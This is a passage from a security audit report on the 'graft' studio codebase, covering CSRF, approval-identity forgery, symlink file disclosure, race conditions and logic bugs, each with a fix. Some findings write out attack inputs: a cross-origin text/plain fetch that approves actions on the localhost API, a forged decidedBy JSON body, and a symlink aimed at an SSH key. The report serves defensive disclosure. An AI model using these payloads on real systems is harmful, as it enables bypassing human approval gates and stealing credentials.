On loopback deployments authorize is undefined by design (no auth), and the API has no Origin/Sec-Fetch metadata check, no CSRF token, and no SameSite-style protection. Because Request.json() parses bodies regardless of Content-Type, the state-changing POST routes — approvals/{id}/decide (L540), changes/commit (L468), compile (L425), compilations/{id}/revert — are reachable via cross-origin 'simple requests': a malicious web page open in the operator's browser can send fetch('http://127.0.0.1:4983/api/studio/v1/approvals/<id>/decide', {method:'POST', body:'{"decision":"approved"}'}) with Content-Type text/plain, which browsers dispatch WITHOUT a CORS preflight. The handler parses it as JSON and executes. Concretely, any visited webpage can silently approve/deny pending approvals (defeating the human gate for destructive ops), commit attacker-selected content files, or trigger recompiles while graft studio runs locally. GET endpoints are likewise dispatched cross-origin (responses unreadable without CORS headers, but side-effecting GETs such as asset presigning still execute). With DNS rebinding (the Node adapter trusts the Host header blindly), reads and even preflighted writes become fully readable/writable too.

**Recommendation:** Reject state-changing requests whose Origin header is present and not an allowed loopback origin, or require a custom header (e.g. X-Graft-Studio: 1) that forces a CORS preflight, and validate Content-Type: application/json on JSON routes.

---

### Client-supplied decidedBy is recorded verbatim and satisfies the approval separation-of-duties check

- **File:** `packages/studio/src/api.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 551, 553, 555
- **Slug:** other-audit-integrity
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed at api.ts: the decide branch computes `payload.decidedBy?.trim() || operator(options)` and passes it straight into decideApproval() (L551-555). In packages/db/src/approvals.ts that single caller-supplied string serves two roles: it is persisted as decided_by (audit attribution) AND is the value compared against requestedById in the UPDATE WHERE clause enforcing requester != decider (L147). Only decided_role (Postgres current_user) is stamped server-side. Therefore any caller of the decide endpoint can approve its own pending approval by inventing an identity (e.g. {"decision":"approved","decidedBy":"chief-operator"}) — the separation-of-duties clause compares against a forged value and passes — while the audit trail records the invented operator as the human decision. I verified the same pattern exists in MCP decide_approval (mcp/server.ts L964 defaults to client-supplied or 'mcp-operator'), confirming this is systemic rather than a one-off, though this finding is scoped to the Studio file. This is a distinct defect from F1 (which is about which actors pass the authorize gate; F1 would persist even with server-stamped identities, and F4 persists even if the gate were human-only), so it is not a duplicate. MEDIUM stands.

L551-555 passes `payload.decidedBy?.trim() || operator(options)` straight into decideApproval(). This single string serves two roles: (1) the attribution identity persisted to the approvals audit trail (approvals.decided_by), and (2) the value compared against requestedById in the UPDATE's WHERE clause that enforces requester != decider (packages/db/src/approvals.ts L147). Because the caller fully controls it, a requester can approve their own pending approval by submitting any invented identity (e.g. {"decision":"approved","decidedBy":"chief-operator"}), and the audit record will falsely show that identity made the decision — destroying both the accountability purpose of the human gate and the integrity of its enforcement. Only decided_role (Postgres current_user) is stamped server-side; the human-visible decidedBy is forgeable. This compounds the agent-authorization finding but applies to any caller of the decide endpoint, including MCP decide_approval which has the same pattern.

**Recommendation:** Derive decidedBy exclusively from the authenticated actor identity resolved server-side; ignore or reject client-provided decidedBy values, and consider cross-checking decidedBy against the DB role/session binding.

---

### Symlinks inside the content directory allow reading arbitrary files via the diff endpoint

- **File:** `packages/studio/src/git.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 329, 330, 383, 395
- **Slug:** other-symlink-file-read
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Confirmed symlink-following read primitive. safeContentPath() (git.ts L296-330) enforces confinement purely lexically — resolve()+prefix check, rejecting absolute paths/NUL/'..' — and performs no lstat, so a symlink INSIDE the content tree pointing outside passes. readFileDiff() then existsSync/statSync/readFileSync on the resolved path (all follow symlinks); when `git diff HEAD -- <path>` output is empty — true for a clean committed symlink — it falls back to addedFileDiff() (L330) which readFileSync's the TARGET and returns its contents verbatim as rendered '+' diff lines to the GET /api/studio/v1/changes/diff caller. Crucially, unlike commitChanges() which intersects requested paths with the live change set, the diff endpoint accepts ANY path (api.ts changes/diff handler passes the raw query param), so the file needn't even appear dirty. Discovery is easy: readCollectionDocs walks the disk and lists symlinked .mdx entries via statSync in the tree endpoint. looksBinary() follows the symlink too but text targets like OpenSSH keys (base64 text, no NUL bytes) pass the sniff. Exploitation requires a planted/hostile symlink (cloned template or supply-chain repo, since write flows create regular files), which keeps this MEDIUM rather than HIGH, matching the filing.

safeContentPath() (L296-330) enforces confinement purely lexically — resolve() + prefix check — and readFileDiff() then operates on the resolved path directly. If the content tree contains a symlink (git repositories can commit symlinks, so a cloned project template or any supply-chain source can plant one, e.g. docs/notes.mdx -> /home/operator/.ssh/id_rsa), existsSync/statSync/readFileSync all follow it. The read path: for an existing file whose `git diff HEAD -- <path>` output is empty (true for committed symlinks and any untracked entry), L395 falls back to addedFileDiff(fullPath), which at L330 does readFileSync(fullPath, 'utf8') on the symlink TARGET and returns its full contents as rendered diff hunks to whoever called GET /api/studio/v1/changes/diff. Result: arbitrary world-readable files outside the content directory (SSH keys, env files, other projects) are disclosed through the Studio API whenever a hostile repository is opened in the Studio. Note looksBinary() also follows the symlink, but text targets sail through to the disclosure path.

**Recommendation:** lstat() the resolved path and refuse symlinks (or resolve real paths and re-run the containment check) in safeContentPath()/readFileDiff before any readFileSync; treat a symlinked changed file as binary/unreadable in the drawer.

---

### TOCTOU between dirty-state preflight and checkout can irreversibly destroy uncommitted content

- **File:** `packages/studio/src/revert.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 44, 63, 81
- **Slug:** other-race-condition
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified the race structurally. revertContentTo() first awaits preflightRevert() — whose own git invocations (cat-file, status --porcelain) are async execFile calls (revert.ts L44-79) — checks pre.dirty.length === 0, and only afterwards awaits `git checkout <sha> -- .` (L81). There is no lock, transaction, or atomicity spanning check and mutation, so any writer landing in the window is silently clobbered: checkout rewrites both the working tree and index for tracked paths, destroying uncommitted edits with no recovery path, while the endpoint reports success. Concurrent writers are a supported topology, not hypothetical — agents call MCP write_content (plain writeFileSync + compile) against the same checkout, and every Studio document save (PUT /document triggers writeDocumentFile + full compile) plus editor autosave writes during normal operation. Even two racing revert/commit requests interleave badly. The window is milliseconds wide, which tempers exploitability, but the failure mode is unrecoverable authored-content loss on an explicitly multi-writer system and the guard's entire stated purpose ('uncommitted changes would be destroyed') fails open. MEDIUM is defensible; keeping it.

revertContentTo() relies on preflightRevert() (L44-79) to refuse when the content directory has uncommitted changes — the guard whose stated purpose is preventing destruction of unsaved work. But the check (`git status --porcelain`) and the mutation (`git checkout <sha> -- .`, L81) are two separate steps with no locking or atomicity. Anything that writes to the work-tree inside the window — an autonomous agent calling MCP write_content, another Studio tab saving a document (PUT /document also triggers a full compile), an editor autosave, or a second revert/commit request — lands after the dirty check and is then overwritten by checkout in BOTH the working tree and the index. Uncommitted means unrecoverable: authored content is silently lost while the endpoint reports success. Concurrent Studio+agent usage is an explicitly supported topology in this codebase (agents and humans operate the same checkout), making the window realistic rather than theoretical.

**Recommendation:** Make the guard atomic: perform the dirty check and checkout inside a single git invocation sequence under an exclusive lock (e.g. flock on the repo, or `git -c core.checkStat minimal stash create` + verify + checkout), or snapshot uncommitted changes (stash/create) before checkout so nothing is ever destroyed unrecoverably.

---

## HIGH_BUG (1)

### Flush-on-navigation saves document A's content into document B (cross-document overwrite)

- **File:** `packages/studio/src/ui/views/collections.tsx`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 100, 101, 122, 140, 143, 184, 186, 187
- **Slug:** other-race-condition
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Traced the full sequence and it holds. On navigation A→B within the debounce window, React re-renders CollectionsView with route=B: persist is recreated via useCallback([route.collection, route.slug, ...]) closing over B, and useAutosave rebinds saveRef.current during that render (autosave.ts 'saveRef.current = save'); the swap effect (L184-194) then calls autosave.flush() BEFORE openDoc(B)'s fetch resolves, so latest.current still holds document A's fields/body/raw and A's DocumentDto. commit() invokes the NEW persist, which takes collection/slug from the route closure (B) but buffers and baseline from latest.current (A); hasUnsavedChanges compares against A's own loaded snapshot so the edited draft correctly reads as changed, and the PUT carries {collection: B, slug: B, data: <A frontmatter>, body: <A body>}. Server-side, api.ts PUT /document hands the payload straight to writeDocument (studio/content.ts), which composes and writes B's file with no consistency check against what the editor had loaded — A's content destroys B's on disk, and the toast reports 'Saved B/B', matching the finding. I checked the plausible counter-mitigations: composeData/buildForm tolerate mismatched or undeclared fields without throwing, and same-collection navigation trivially passes collection-B schema validation, so nothing blocks the write. The secondary variant also verifies: openDoc (L146-171) starts unsequenced fetches with no cancellation or stale-response guard, so out-of-order responses display one document's bytes under another's route and repeat the cross-write on the next save. Silent cross-document data destruction justifies HIGH_BUG.

`useAutosave` rebinds `saveRef.current = save` during every render (packages/studio/src/ui/lib/autosave.ts), and `persist` (L100-141) reads `collection`/`slug` from the CURRENT route closure while reading the edit buffers and the comparison baseline from `latest.current`. When an operator edits document A and then selects document B before the 900ms debounce fires, React re-renders with route=B first: `persist` is recreated capturing `{collection: B, slug: B}` and `saveRef.current` is rebound to it. Only afterwards does the swap effect (L184-194) call `autosave.flush()`, which invokes this NEW persist while `latest.current` still holds document A's edited `fields`/`body`/`raw` and `snapshot.doc` = A's DocumentDto (`openDoc(B)` hasn't resolved yet). The `hasUnsavedChanges` guard compares against A's own loaded snapshot, so it correctly reports 'changed', and the save proceeds as `PUT /document {collection: B.name, slug: B.slug, data: <A's composed frontmatter>, body: <A's body>}` (raw mode likewise writes A's `raw`). The server writes document B's file with document A's entire content; the toast even reports 'Saved B/B'. This silently destroys document B's content — precisely the 'pending edit lands on the wrong file' failure the comment on L183 claims the flush prevents. Secondary variant: navigating across two documents quickly starts two unsequenced `openDoc` fetches with no cancellation/stale-response guard in `openDoc` (L146-171); if responses resolve out of order the editor displays one document's bytes under another's route, and the next debounced save repeats the cross-document write.

**Recommendation:** Make the save self-consistent: capture the document identity inside the same ref as the buffers (e.g., include `doc.collection`/`doc.slug` from `snapshot.doc` in the payload instead of reading them from the route closure), so a flush always targets the document whose bytes it holds — and skip the write when they disagree with the current route. Alternatively, flush synchronously BEFORE the route changes (in the tree's click handler) rather than in an effect that runs after re-render. Additionally, sequence `openDoc` fetches (ignore/cancel responses whose `{collection, slug}` no longer match the current route) to close the out-of-order-response variant.

---

## BUG (14)

### Unvalidated currency code passed to Intl.NumberFormat can crash the catalog page

- **File:** `examples/landing-page/app/products/page.tsx`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 14, 39
- **Slug:** other-unvalidated-render-input
- **Confidence:** low
- **Revalidation:** confirmed
- **Reasoning:** Confirmed end-to-end. The products collection schema (registry/commerce/graft/commerce.ts:46-49) declares currency as optional free-form field.string with no format constraint, so authored frontmatter like `currency: US` or `currency: dollars` passes compile-time validation. page.tsx formatPrice() forwards it directly into new Intl.NumberFormat('en-US', { style: 'currency', currency }); per ECMA-402 IsWellFormedCurrencyCode, any value that is not exactly three ASCII letters throws a RangeError at construction. There is no try/catch, no error boundary, and dynamic = 'force-dynamic' means the throw happens during server render, failing the /products route with a 500 — one malformed document breaks the entire catalog page. The OrderForm mapping at line ~48 propagates the same value client-side. As the finding itself states, the input originates from git-authored MDX (repo-write trust: authors or agents), not anonymous HTTP, so this is a robustness/availability bug within a legitimate authoring flow rather than a remotely exploitable vulnerability — exactly matching its BUG classification. The defect is real, deterministic, and reachable through normal operation.

formatPrice() forwards the product frontmatter's optional `currency` string directly into new Intl.NumberFormat("en-US", { style: "currency", currency }). Per ECMA-402, Intl throws a RangeError when the currency argument is not exactly three ASCII letters. The products collection schema declares currency as a free-form optional field.string (packages/registry/registry/commerce/graft/commerce.ts) with no format constraint, so an authored product with e.g. `currency: "US"` or "dollars" compiles fine but throws during server render of app/products/page.tsx, taking down the entire catalog page (no error boundary). Exploitability is limited: the value originates from git-authored MDX compiled by trusted authors/agents, not from anonymous HTTP input, so this is a robustness bug rather than a security vulnerability. All other rendered fields (title, description, MDX body) go through React escaping / the documented content-as-code MDX pipeline and are not attacker-controllable beyond repo-write trust.

**Recommendation:** Validate currency against /^[A-Za-z]{3}$/ in the collection schema (custom Zod refine) or guard formatPrice with a try/catch fallback to a plain numeric format so one malformed document cannot break the page.

---

### placeOrder qty has no upper bound, allowing totals beyond safe integer precision

- **File:** `examples/landing-page/graft/commerce.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 157, 158, 201, 212
- **Slug:** other-logic-bug
- **Confidence:** high
- **Revalidation:** confirmed
- **Reasoning:** Confirmed: the qty check (Number.isFinite && >=1 && Number.isInteger) has no ceiling, so qty=9007199254740992 passes z.number() and the handler gate; totalCents += product.priceCents * line.qty (L201) then exceeds 2^53 for any price ≥ 2 cents, losing precision in IEEE doubles, and the corrupted total is persisted to jsonb and echoed to the caller (L212). This is reachable anonymously via public placeOrder, so order totals can be silently corrupted and nonsensical quantities accepted — a genuine logic/data-integrity bug, correctly classed as BUG rather than a security vuln given no payment provider. Minor inaccuracy: the side-note that listOrders' negative limit reaches Postgres 'treated as unlimited' is wrong (Postgres errors on negative LIMIT), but that's incidental to the core defect.

Line-item validation (L157-166) enforces `Number.isInteger(qty) && qty >= 1` but no ceiling, so `qty: 9007199254740991` passes. `totalCents += product.priceCents * line.qty` (L201) then exceeds Number.MAX_SAFE_INTEGER for any price > 1 cent; the value is stored in a jsonb column as a double and returned to the caller (L212), producing silently corrupted order totals. There is no payment provider in this demo so direct financial loss is limited, but any downstream fulfillment/billing logic consuming totalCents would receive garbage, and a single request can also allocate enormous snapshotted arrays. Same missing-bound pattern affects the scope-gated listOrders `limit` (L225-230), where a negative value reaches SQL LIMIT (Postgres treats it as unlimited).

**Recommendation:** Add a realistic upper bound to qty (e.g. z.number().int().min(1).max(10000)) and consider validating totalCents stays within Number.MAX_SAFE_INTEGER; likewise clamp listOrders' limit.

---

### Nullish coalescing skips empty-string fallback, backfilling empty meta descriptions

- **File:** `examples/landing-page/migrations/0001-pages-description.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 20, 24, 30
- **Slug:** other-logic-bug
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified against the source. firstSentence is computed as body.replace(/^#+ .*$/gm, '').replace(/[*_`>[\]]/g, '').trim().split(/(?<=\.)\s/)[0]; when the body is empty or consists solely of headings/markdown decoration, trim reduces it to '' and split always yields [''], so firstSentence === '' — an empty string, not nullish. The fallback expression existing ?? tagline ?? firstSentence ?? title therefore short-circuits at '' and the documented final fallback ('else the title', stated in the file header and description) is never reached; body-less documents get description: ''. Since '' is a valid string it passes post-backfill schema validation, silently shipping pages with empty meta/og:description tags, defeating the migration's stated purpose ('every existing page needs one'). Secondary confirmation of sloppiness: title itself defaults to '', so the terminal ?? can never fall through anyway. This is a pure data-quality logic error in a backfill tool with no security impact — not exploitable by any party — but the described misbehavior is real and deterministic, which is what matters for a BUG-classified finding.

The transform derives `description` via `existing ?? tagline ?? firstSentence ?? title` (line 30). `??` only falls through on null/undefined, but `firstSentence` is computed from `body` and yields "" (empty string, not nullish) whenever the document body is empty or consists solely of headings/markdown decoration that trims away (lines 20-24: replace -> trim -> split -> [0]). In that case the documented intent — 'else the title' — is never reached: the migration backfills `description: ""`, defeating the stated purpose ('every existing page needs one') for body-less documents and producing empty meta/og:description tags. This is a data-quality logic error in a backfill, not exploitable; note also that `title` itself defaults to "", so the final fallback cannot be nullish either.

**Recommendation:** Filter out empty results before the fallback chain, e.g. compute candidates as `[existing, tagline, firstSentence?.trim(), title].find(v => v)` or use `||` semantics for the derived strings (safe here since none are legitimately meant to be empty), so a blank first sentence falls through to `title`.

---

### Tokens without a `sub` claim yield actors with undefined identity, degrading rate limiting and audit attribution

- **File:** `packages/auth/src/oidc.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 105, 106, 107, 108
- **Slug:** other-auth-attribution-gap
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Every link in the chain is confirmed in source. IssuerVerifier.verify() calls jwtVerify(token, getKey, { issuer, audience }) with no requiredClaims (none exists anywhere in the repo), and jose v6 treats `sub` as optional — so a signature-valid, iss-matching token without `sub` authenticates successfully and returns { kind, id: undefined }. resolver.ts passes the actor through unchanged with no identity check. Downstream, functions-handler.ts:217-218 derives rateKey as `${actor.kind}:${actor.id ?? ip}` for non-anonymous actors, so every sub-less caller collapses into a bucket keyed by clientIp(), which trusts attacker-suppliable x-forwarded-for/x-real-ip — meaning the rate identity is shared across users behind one egress AND freely rotated by any single holder of a valid sub-less token, defeating the per-caller limit entirely. Audit rows persist actorId: actor?.id ?? null (functions-handler.ts:391) and approval requests persist requestedById: null, breaking FunctionActor's documented 'stable identity' contract for non-anonymous actors and weakening forensic attribution of privileged/destructive invocations. Triggering is realistic rather than hypothetical: OIDC access tokens and machine/service tokens frequently omit `sub`, and nothing constrains issuers to mint ID-token semantics. Scope enforcement still applies, so there is no privilege escalation — consistent with the finding's self-assessment as an attribution/rate-limiting correctness bug rather than an auth bypass. Real defect with deterministic consequences; BUG severity is correct.

IssuerVerifier.verify() builds the FunctionActor as `id: payload.sub` (line ~107) without requiring `sub` (no `requiredClaims` passed to jwtVerify). jose does not mandate `sub`, so a signature-valid token from a trusted issuer that omits it authenticates successfully as `{ kind: <actorKind>, id: undefined, scopes: [...] }`. Downstream, createFunctionsHandler derives its rate identity as `${actor.kind}:${actor.id ?? ip}` (functions-handler.ts:218), so every sub-less actor silently collapses into a client-IP-keyed bucket (shared across all users behind one NAT/proxy, and trivially rotated by attackers), while audit rows and approval records persist `null` actorId — breaking the 'stable identity for non-anonymous actors' invariant documented on FunctionActor and weakening forensic attribution of privileged invocations. Impact is limited because scope-based access rules still apply, so this is a correctness/attribution bug rather than an escalation.

**Recommendation:** Pass `requiredClaims: ['sub']` to jwtVerify (rejecting sub-less tokens as TOKEN_INVALID), or coerce a deterministic fallback identity and document it; alternatively treat actors with no id as a distinct kind so rate limiting and audit don't silently fall back to client IP.

---

### Content-dir watcher not refreshed after graft.config reload changes contentDir

- **File:** `packages/cli/src/commands/dev.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 73, 77, 114
- **Slug:** other-stale-watcher-logic-bug
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified in dev.ts: FSWatcher instances are created once after the initial runCompile (watch(config.contentDir, {recursive:true}, ...) and watch(config.projectDir, ...)) capturing the directory strings resolved from the startup-time config object. Inside runCompile, when configDirty is set the code reassigns the module-level let config = await loadConfig(configPath) and compiles from the NEW config.contentDir/config.collections — but the watchers are never closed/recreated, so they keep polling the OLD paths. After a graft.config.ts edit that relocates contentDir, MDX saves in the new location generate no watcher event, schedule() never fires, and the debounce→compile loop silently stalls even though compile would succeed if invoked (the config watcher still fires on further config edits, but pure content edits do not). The mismatch — compile reading one tree while watching another — is a genuine logic inconsistency. Correctly classified as a non-security correctness bug (local operator tooling, no trust boundary crossed): BUG severity, true positive.

`devCommand` creates its FSWatchers once at startup (line 114) bound to the initially resolved `config.contentDir`. When graft.config.ts is edited, `runCompile` sets `configDirty`, reloads the config (lines 73-77), and compiles from the NEW `config.contentDir` (lines 80-90) — but the watcher still monitors the OLD directory. After a config edit that relocates `contentDir`, every subsequent MDX edit in the new location is invisible to the watcher: no debounce fires, no recompile happens, and `graft dev` silently stalls in the edit->compile loop it exists to serve. The same staleness applies if `projectDir` semantics changed. Not a security issue (local operator tooling, no trust boundary crossed), but a real logic inconsistency: compile reads one directory while watching another.

**Recommendation:** After reloading config in runCompile, compare the new contentDir (and projectDir) against the currently watched paths; if changed, close and recreate the FSWatchers on the new directories.

---

### RegistryFileDescriptor.target accepts unrestricted paths (traversal unchecked at contract level)

- **File:** `packages/contracts/src/introspection.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 160, 161
- **Slug:** other-missing-path-validation
- **Confidence:** high
- **Revalidation:** ~~false positive~~
- **Reasoning:** The code-level observation is accurate: introspection.ts declares target as bare z.string() (the manifest-side registryFileSchema uses z.string().min(1)), neither rejects '..'/absolute paths/backslashes, and planAdd computes join(targetDir, file.target) with writeFileSync in applyPlan and no containment assertion. However, no concrete attack exists against the code as shipped. loadItem resolves manifests exclusively from registryRoot() — the registry/ directory inside the installed @usegraft/registry package itself, derived from import.meta.url — and the sole production caller (cli/src/commands/add.ts) invokes planAdd(names, { targetDir }) with no root override, so only first-party bundled items (commerce, comments) can ever be processed. The wire-shape RegistryFileDescriptor is only ever produced by describeItem() from those validated bundled manifests for MCP browse/describe display; it is never parsed from untrusted input and used to drive writes. A malicious manifest would require either compromising the npm package supply chain (at which point the attacker ships arbitrary TypeScript that graft add copies into the project — an equivalent-or-greater trust boundary, since installing an item already means executing adopted code) or a remote HTTP registry feature that does not exist today, as the module comment itself notes ('A remote HTTP registry would swap registryRoot + loadItem for a fetch'). The specific mitigations are therefore: first-party-only item sourcing pinned to the installed package directory, and the pre-existing trust boundary that item adoption already implies arbitrary-code trust. Legitimate latent-hardening guidance for a future remote-registry feature, but not exploitable now — hence false-positive at BUG severity.

The wire contract for registry items declares `target` as just `z.string().min(1)` (line 161), with no constraint against `..` segments, absolute paths, or backslashes. Downstream, packages/registry/src/add.ts writes to `join(targetDir, file.target)` verbatim. Today this is not exploitable: bundled items are first-party trusted code, and installing an item already means adopting authored TypeScript into the project (an equivalent trust boundary). But the code explicitly anticipates remote registries ('A remote HTTP registry would swap registryRoot + loadItem for a fetch'), at which point a malicious manifest could write files anywhere under the permissions of the process. Flagged as hardening/latent, not an exploitable vulnerability today.

**Recommendation:** Constrain `target` at the Zod layer (e.g. relative POSIX path regex rejecting leading `/`, `..` segments, drive letters, and backslashes), and additionally assert the resolved path stays within targetDir before writeFileSync in add.ts.

---

### Validated migration output discarded; change detection uses key-order-sensitive JSON.stringify equality

- **File:** `packages/core/src/data-migrations.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 114, 122, 123
- **Slug:** other-logic-bug
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Both defects verified in runDataMigration: after collection.schema.safeParse(next) succeeds, the code pushes {id, data: next} — the RAW transform output — never validated.data, so Zod defaults/coercions/transforms never materialize in stored rows even though the module's stated purpose is backfilling rows 'to the NEW shape'; reads stay correct only because parseStoredRow re-validates, masking permanent byte-level drift that future raw-data migrations will trip over. Second, the changed/unchanged decision is raw JSON.stringify(next) === JSON.stringify(row.data): order-sensitive and undefined-dropping. Because Postgres jsonb normalizes key order (length-then-bytewise) on write/read, any transform that reconstructs objects in author-written order compares unequal to the round-tripped row even when logically identical — the row is counted changed, spuriously rewritten, and counted in docCount. One correction to the finding's framing: the shipped graft migrate command gates re-execution through the migrations_applied ledger (pending = migrations.filter(m => !appliedIds.has(m.id))), so inflated ledgers 'across every run' only occur for repeat invocations via the exported runDataMigration API or fresh branches, not ordinary CLI re-runs. Still a genuine logic bug in a data-integrity path; BUG severity is correct and it is not security-exploitable beyond operator confusion.

In runDataMigration, collection.schema.safeParse(next) succeeds (L114-115) but the code persists the RAW transform output next rather than validated.data (updates.push({ id, data: next }), L123). Zod-level transforms, defaults, and coercions therefore never materialize in the stored rows, so migrated data can permanently drift from the canonical shape the schema produces — undermining the stated goal of backfilling rows to the NEW shape. Additionally, the changed/unchanged decision compares JSON.stringify(next) === JSON.stringify(row.data) (L122), which is sensitive to object key ordering and silently drops undefined values: a logically identical row whose keys come back in a different order (typical when a transform reconstructs objects) is counted as changed and rewritten, producing spurious updates and inflated docCount ledger entries across every run of an already-applied migration.

**Recommendation:** Persist validated.data instead of next, and compare canonical forms (e.g., the same canonicalJson helper used for approvals, which sorts keys, or deep-equal) rather than raw JSON.stringify.

---

### Artifact replacement window where the static index does not exist

- **File:** `packages/db/src/static.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 311, 312
- **Slug:** other-race-condition
- **Confidence:** low
- **Revalidation:** confirmed
- **Reasoning:** The flagged sequence is present verbatim in projectStaticContent: rmSync(options.path, { force: true }) followed by renameSync(tmpPath, options.path), introduced specifically because rename-over-existing was assumed to fail on Windows. During the window between these two synchronous calls the artifact path does not exist, which directly falsifies the adjacent code comment claiming readers 'open a fully-written file or the old one'. The read side proves the observable effect: openStaticIndex begins with existsSync(path) and throws STATIC_INDEX_NOT_FOUND otherwise, so any concurrent reader (dev server, deployed app re-serving while graft compile runs) gets a hard error instead of stale-or-new data. Additionally, a crash after rmSync but before renameSync destroys .graft/index.db entirely until the next successful compile — a permanent loss, not just a transient window. On POSIX, rename(2) atomically replaces the existing file, making rmSync unnecessary there and confirming the recommended fix is sound. This is a genuine availability/correctness defect in the artifact-replacement routine, though non-adversarial (no attacker control over timing beyond triggering a rebuild), which matches its BUG classification.

projectStaticContent replaces the compiled artifact with rmSync(options.path) followed by renameSync(tmpPath, options.path). Between these two calls the artifact file does not exist at all, contradicting the code comment's invariant that readers 'open a fully-written file or the old one'. A reader calling openStaticIndex in that window gets STATIC_INDEX_NOT_FOUND instead of stale-or-new data, and if the process crashes after rmSync but before renameSync, the index artifact is destroyed entirely until the next successful compile. Impact is limited because compile normally runs as a build step before serving, hence BUG rather than a security severity.

**Recommendation:** Use renameSync directly (atomic on POSIX) and handle the Windows case separately, or write to a versioned filename and swap a symlink/directory pointer atomically so a complete artifact always exists at the read path.

---

### Unbounded qty allows floating-point overflow, corrupting order totals

- **File:** `packages/registry/registry/commerce/graft/commerce.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 158, 207
- **Slug:** other-logic-bug
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Same defect as F5 in the registry copy: qty validated only as finite integer ≥1 with no upper bound (L158 area), then totalCents += product.priceCents * line.qty (L207) in IEEE doubles — any product of price×qty beyond 2^53 silently rounds, and the imprecise total is persisted to jsonb and returned as authoritative. Reachable anonymously via public:true placeOrder; e.g. priceCents=999 with qty=10^15 yields a rounded, wrong stored total, and absurd quantities are accepted outright. No confidentiality impact and no payment provider, so data-integrity/logic-bug classification (BUG) is correct, exactly as filed. Identical mechanism to F5 but different file (registry vs example), hence not a duplicate. True-positive.

qty is validated only as an integer >= 1 (L158); there is no upper bound. At L207 `totalCents += product.priceCents * line.qty` operates in IEEE doubles, so qty values beyond Number.MAX_SAFE_INTEGER / priceCents silently lose precision — e.g. priceCents=999 with qty=2^53 yields a rounded, incorrect totalCents that is persisted as the authoritative order total. Orders with nonsensical quantities (10^15 units) are also accepted and stored. With no payment provider this is primarily a data-integrity problem, but any downstream fulfillment/invoicing logic consumes these corrupted totals.

**Recommendation:** Add a sane upper bound on qty (e.g. <= 100000) and/or compute totals with integer-safe arithmetic (BigInt) or validate totalCents <= Number.MAX_SAFE_INTEGER before persisting.

---

### applyPlan trusts stale plan snapshot for conflict detection, silently overwriting concurrently changed files

- **File:** `packages/registry/src/add.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 168, 185
- **Slug:** other-time-of-check-to-time-of-use
- **Confidence:** medium
- **Revalidation:** confirmed
- **Reasoning:** Verified exactly as described: applyPlan's REGISTRY_FILE_EXISTS guard (add.ts ~L168) tests only plan.conflicts, which planAdd computed from disk at planning time (~L99-100, L147), and the write loop (~L185) executes mkdirSync/writeFileSync without ever re-running existsSync/readFileSync against current state; the identical-skip flag is equally stale. planAdd/applyPlan are exported public API of @usegraft/registry (imported by the CLI from the package entrypoint), and their documented purpose includes separate dry-run/apply invocations where the check-to-use gap is unbounded. Even in the bundled CLI flow, addCommand runs planAdd then applyPlan synchronously but other processes — including agents, which Graft explicitly treats as first-class concurrent actors mutating the project — can change a target between the two calls. Concrete failure: planAdd previews cleanly, another process edits graft/comments.ts, applyPlan then overwrites it with registry content even though the user never passed --overwrite, violating the guard's stated contract ('guarded at apply time'). This is a genuine correctness/race bug rather than a security bypass, so BUG severity is appropriate; the fix (re-stat and recompute the conflict decision immediately before each write inside applyPlan) is standard TOCTOU hygiene.

The REGISTRY_FILE_EXISTS guard (L168-176) decides solely from plan.conflicts, which planAdd snapshotted earlier (exists/identical computed at L99-100, conflicts at L147). applyPlan never re-stats targets before writeFileSync (L185): if a differing file appears or changes on disk between planning and applying — another process, an editor save, or a concurrent agent write (Graft explicitly treats agents as first-class actors mutating the same project) — it is overwritten without the guard firing, even though the user never passed --overwrite. The CLI re-plans immediately before applying so its window is small, but planAdd/applyPlan are exported library APIs designed for separate dry-run/apply invocations where the gap is unbounded.

**Recommendation:** Inside applyPlan, immediately before each writeFileSync, re-run the existsSync/readFileSync comparison against current disk state and recompute the conflict decision (throwing REGISTRY_FILE_EXISTS unless options.overwrite), rather than trusting the plan-time snapshot.

---

### moduleIdentifier collisions generate duplicate import declarations, breaking the regenerated barrel

- **File:** `packages/registry/src/barrel.ts`
- **Recent committers:** AndersonDesign1 <josanderson25@gmail.com>
- **Lines:** 18, 29, 30
- **Slug:** other-generated-code-collision
- **Confidence:** medium
- **Revalidation:** confirmed
